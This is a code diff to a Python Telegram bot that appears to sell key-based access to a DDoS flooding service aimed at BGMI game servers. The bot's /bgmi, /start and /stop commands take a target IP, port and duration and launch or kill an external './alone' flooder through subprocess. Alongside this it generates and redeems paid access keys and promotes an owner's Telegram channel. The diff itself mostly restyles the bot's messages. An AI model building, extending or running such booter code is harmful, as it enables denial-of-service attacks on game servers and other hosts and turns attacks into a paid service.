@@ -73,13 +73,13 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 key = generate_key()
                 keys[key] = expiration_date
                 save_keys()
-                response = f"GENKEY\n {key}\n VALIDITY\n {expiration_date}\n\nENTER YOUR KEY \n/redeem"
+                response = f"🔑 🅺︎🅴︎🆈︎ 🅶︎🅴︎🅽︎🆁︎🅰︎🆃︎🅴︎🅳︎\n {key}\n⏳ 🅅🄰🄻🄸🄳🄸🅃\n {expiration_date}\n\n🅁🄴🄳🄴🄴🄼  🅈🄾🅄🅁  🄺🄴🅈. /redeem"
             except ValueError:
-                response = f"USE COMAND-> /genkey 1 HOURE AND DAYS"
+                response = f"𝙐𝙎𝘼𝙂𝙀 /genkey 1 𝙃𝙊𝙐𝙍𝙎 𝙖𝙣𝙙 𝘿𝘼𝙔𝙎"
         else:
-            response = "USAGE-> /genkey 1 HOURE AND DAYS"
+            response = "𝙐𝙎𝘼𝙂𝙀 /genkey 1 𝙃𝙊𝙐𝙍𝙎 𝙖𝙣𝙙 𝘿𝘼𝙔𝙎"
     else:
-        response = f"❌ ONLY OWNER CAN USE THIS COMMAND -> @GODxAloneBOY"
+        response = f"❌ 𝘼𝘾𝘾𝙀𝙎𝙎 𝘿𝙄𝙉𝙄𝙀𝘿. 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙏𝙊 𝙊𝙒𝙉𝙀𝙍 -@GODxAloneBOY"
 
     await update.message.reply_text(response)
 
@@ -99,11 +99,11 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_users()
             del keys[key]
             save_keys()
-            response = f"KEY REDEEM SUCCESSFULLY "
+            response = f"🔑 🅺︎🅴︎🆈︎ 🆁︎🅴︎🅳︎🅴︎🅴︎🅼︎ 🆂︎🆄︎🅲︎🅲︎🅴︎🆂︎🅵︎🆄︎🅻︎🅻︎🆈︎"
         else:
-            response = f"OWNER- @GODxAloneBOY"
+            response = f"𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍 - @GODxAloneBOY"
     else:
-        response = f"USE COMMAND-> /redeem"
+        response = f"𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔. /redeem"
 
     await update.message.reply_text(response)
 
@@ -113,11 +113,11 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text(" ❌ ACCESS DENIED CONTACT TO OWNER-> @GODxAloneBOY")
+        await update.message.reply_text("🔑 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙊𝙍𝙄𝙕𝙀𝘿. 𝘿𝙈 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY")
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text('USE COMMAND->  /bgmi <IP> <PORT> <DURATION>')
+        await update.message.reply_text(' 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 𝙐𝙎𝙀 /bgmi «𝙄𝙋» «𝙋𝙊𝙍𝙏» «𝘿𝙐𝙍𝘼𝙏𝙊𝙄𝙉»')
         return
 
     target_ip = context.args[0]
@@ -125,7 +125,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./alone', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'🔻ATTACK PENDING🔻 \n\nTARGET-> {target_ip}\nPORT-> {port} \nDURATOIN-> {duration}\n\n GODxCHEATS DDOS')
+    await update.message.reply_text(f'😈🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🆃︎🅰︎🆁︎🅶︎🅴︎🆃︎ 🆂︎🅴︎🆃😈︎\n\n👙 🅃🄰🅁🄶🄴🅃 {target_ip}\n🍆 🄿🄾🅁🅃 {port} \n⏳ 🄳🅄🅁🄰🅃🄾🄸🄽 {duration}\n\n𝙏𝘼𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏 𝘽𝙐𝙏𝙏𝙊𝙉')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -133,19 +133,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("TAP TO COMMANDS-> /alone\n\nOWNER- @GODxAloneBOY")
+        await update.message.reply_text("𝙏𝘼𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿. /alone\n\n𝙅𝙊𝙄𝙉 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 - https://t.me/+03wLVBPurPk2NWRl")
         return
 
     if flooding_process is not None:
-        await update.message.reply_text('🔻ATTACK PENDING🔻->\n\nTAP TO STOP-> /stop')
+        await update.message.reply_text('🔰🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🅿︎🅴︎🅽︎🅳︎🅸︎🅽︎🅶🔰︎\n\n𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙎𝙏𝙊𝙋 /stop')
         return
 
     if flooding_command is None:
-        await update.message.reply_text('TAP TO CONTINUE -> /alone\n\nOWNER- @GODxAloneBOY')
+        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 /alone\n\n𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙏𝙊 𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍- @GODxAloneBOY')
         return
 
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🔻 ATTACK STARTED🔻\nJOIN MY CHANNEL\nSEND FEEDBACK TO-> @GODxAloneBOY\n\n https://t.me/+03wLVBPurPk2NWRl')
+    await update.message.reply_text('🔰🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🆂︎🆃︎🅰︎🆁︎🆃︎🅴︎🅳🔰︎\n𝙅𝙊𝙄𝙉 𝙈𝙔 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇\n𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙏𝙊 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY\n\n🇮🇳 https://t.me/+03wLVBPurPk2NWRl ')
 
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -153,39 +153,38 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("TAP TO COMMAND -> /alone\n\nOWNER- @GODxAloneBOY")
+        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 /alone\n\n𝙅𝙊𝙄𝙉 𝙈𝙔 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇- https://t.me/+03wLVBPurPk2NWRl")
         return
 
     if flooding_process is None:
-        await update.message.reply_text('❌ ERROR NO ATTACK AVAILABLE')
+        await update.message.reply_text('❌ 𝙀𝙍𝙍𝙊𝙍.  𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙎 𝙉𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙂 ')
         return
 
     flooding_process.terminate()
     flooding_process = None
-    await update.message.reply_text('🔻ATTACK STOPPED🔻\n\nTAP TO START-> /start')
+    await update.message.reply_text('🔰🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🆂︎🆃︎🅾︎🅿︎🅳🔰︎\n\n𝙏𝙊𝙋 𝙏𝙊 𝙍𝙀𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 /start')
     
     await update.message.reply_text(response)
 
-# Update the alone_command function to include buttons
+# Update the alome_command function to include buttons
 async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Create buttons
     markup = ReplyKeyboardMarkup(
         [
-            "/bgmi" 
-            "/start"
-            "/stop"
+            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
+            [KeyboardButton("/stop")]
         ],
         resize_keyboard=False
     )
     
     response = (
-        "ALL COMMANDS\n\n"
-        "/genkey-> GENRAT FOR KEY\n"
-        "/redeem-> USE TO REDEEM KEY\n"
-        "/bgmi-> ATTACK TARGET SET\n"
-        "/start-> FOR START ATTACK \n"
-        "/stop-> FOR STOP ATTACK\n\n"
-        f"OWNER-> {OWNER_USERNAME}"
+        "𝘼𝙇𝙇 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎\n\n"
+        "/genkey-> ༒︎  𝙁𝙊𝙍 𝙂𝙀𝙉𝙍𝘼𝙏𝙀 𝙆𝙀𝙔\n"
+        "/redeem-> ༒ ︎𝙁𝙊𝙍 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔\n"
+        "/bgmi->   ༒︎ 𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙏𝘼𝙍𝙂𝙀𝙏 𝙎𝙀𝙏\n"
+        "/start->   ༒ ︎𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏\n"
+        "/stop->   ༒︎ 𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋\n\n"
+        f"✅𝙊𝙒𝙉𝙀𝙍-> {OWNER_USERNAME}"
     ) # Send message with the keyboard buttons
     await update.message.reply_text(response, reply_markup=markup)
 
